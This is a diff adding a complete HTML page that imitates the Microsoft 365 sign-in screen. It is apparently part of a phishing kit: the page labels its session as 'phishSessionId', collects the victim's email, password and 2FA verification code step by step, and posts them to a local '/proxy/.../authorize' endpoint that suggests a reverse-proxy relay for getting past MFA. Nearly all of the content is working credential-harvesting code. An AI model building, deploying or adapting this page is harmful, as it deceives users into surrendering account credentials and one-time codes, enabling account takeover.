@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your Microsoft account</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e9edf5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 44px;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 108px;
+            height: 24px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e1e1e;
+            margin-bottom: 12px;
+        }
+        
+        h2 {
+            font-size: 18px;
+            font-weight: 400;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            border-bottom-color: #0067b8;
+        }
+        
+        input::placeholder {
+            color: #999;
+        }
+        
+        .button {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            float: right;
+            transition: background 0.2s;
+        }
+        
+        .button:hover {
+            background: #005da6;
+        }
+        
+        .button:active {
+            background: #004e8c;
+        }
+        
+        .links {
+            margin-top: 24px;
+            clear: both;
+        }
+        
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            margin-right: 16px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 24px;
+            color: #999;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .error {
+            color: #e81123;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <svg viewBox="0 0 108 24">
+                    <path fill="#f25022" d="M0 0h11v11H0z"/>
+                    <path fill="#7fba00" d="M13 0h11v11H13z"/>
+                    <path fill="#00a4ef" d="M0 13h11v11H0z"/>
+                    <path fill="#ffb900" d="M13 13h11v11H13z"/>
+                </svg>
+            </div>
+            
+            <h1>Sign in</h1>
+            <h2 id="subtitle">to continue to Microsoft 365</h2>
+            
+            <form id="loginForm" action="/proxy/common/oauth2/v2.0/authorize" method="POST">
+                <div class="form-group" id="emailGroup">
+                    <input type="email" id="login" name="login" placeholder="Email, phone, or Skype" required autofocus>
+                    <div class="error" id="emailError">Enter a valid email address</div>
+                </div>
+                
+                <div class="form-group hidden" id="passwordGroup">
+                    <input type="password" id="passwd" name="passwd" placeholder="Password">
+                    <div class="error" id="passwordError">Incorrect password. Please try again.</div>
+                </div>
+                
+                <div class="form-group hidden" id="codeGroup">
+                    <input type="text" id="otc" name="otc" placeholder="Enter verification code">
+                    <div class="error" id="codeError">Invalid code. Please try again.</div>
+                </div>
+                
+                <input type="hidden" name="sessionId" id="sessionId" value="">
+                <input type="hidden" name="client_id" value="00000000-0000-0000-0000-000000000000">
+                <input type="hidden" name="redirect_uri" value="https://login.microsoftonline.com/common/oauth2/nativeclient">
+                <input type="hidden" name="response_type" value="code">
+                
+                <button type="submit" class="button" id="submitBtn">Next</button>
+            </form>
+            
+            <div class="links">
+                <a href="#" id="noAccount">No account? Create one!</a>
+                <a href="#" id="signInOptions">Sign-in options</a>
+            </div>
+            
+            <div class="footer">
+                <span>© 2025 Microsoft</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function generateSessionId() {
+            return 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+        }
+
+        const sessionId = generateSessionId();
+        document.getElementById('sessionId').value = sessionId;
+        sessionStorage.setItem('phishSessionId', sessionId);
+        
+        console.log('🆔 Session ID:', sessionId);
+
+        let step = 'email';
+        let email = '';
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const form = this;
+            const currentSessionId = document.getElementById('sessionId').value;
+            form.action = '/proxy/common/oauth2/v2.0/authorize?sessionId=' + encodeURIComponent(currentSessionId);
+
+            if (step === 'email') {
+                email = document.getElementById('login').value;
+
+                if (!email || !email.includes('@')) {
+                    document.getElementById('emailError').style.display = 'block';
+                    return;
+                }
+
+                document.getElementById('emailError').style.display = 'none';
+                document.getElementById('emailGroup').classList.add('hidden');
+                document.getElementById('passwordGroup').classList.remove('hidden');
+                document.getElementById('subtitle').textContent = 'Enter password';
+                document.getElementById('submitBtn').textContent = 'Sign in';
+                document.getElementById('passwd').focus();
+
+                step = 'password';
+
+            } else if (step === 'password') {
+                const password = document.getElementById('passwd').value;
+
+                if (!password) {
+                    document.getElementById('passwordError').style.display = 'block';
+                    return;
+                }
+
+                form.submit();
+
+            } else if (step === 'code') {
+                const code = document.getElementById('otc').value;
+
+                if (!code) {
+                    document.getElementById('codeError').style.display = 'block';
+                    return;
+                }
+
+                form.submit();
+            }
+        });
+
+        document.getElementById('noAccount').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'https://signup.live.com';
+        });
+
+        document.getElementById('signInOptions').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Please use email and password to sign in');
+        });
+
+        function checkUrlFor2FA() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('2fa') === 'required') {
+                document.getElementById('passwordGroup').classList.add('hidden');
+                document.getElementById('codeGroup').classList.remove('hidden');
+                document.getElementById('subtitle').textContent = 'Enter verification code';
+                document.getElementById('submitBtn').textContent = 'Verify';
+                document.getElementById('otc').focus();
+                step = 'code';
+            }
+        }
+
+        checkUrlFor2FA();
+    </script>
+</body>
+</html>
